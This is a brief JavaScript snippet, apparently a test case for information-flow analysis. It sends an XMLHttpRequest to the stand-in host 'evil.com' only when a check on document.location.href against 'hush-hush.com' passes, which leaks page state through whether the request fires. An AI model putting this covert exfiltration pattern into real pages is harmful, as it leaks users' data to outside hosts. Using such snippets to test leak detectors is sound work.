var TopString = (45).toString(12);
document.location.href = TopString;

var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");

function foo() {
	try{
		var i = 0;
		while (i < 10) {
			i++;
			if (document.location.href != "hush-hush.com")
				throw 5;
		}
		x.send(null);	
	} catch(_) {}
}

foo();
p = 1;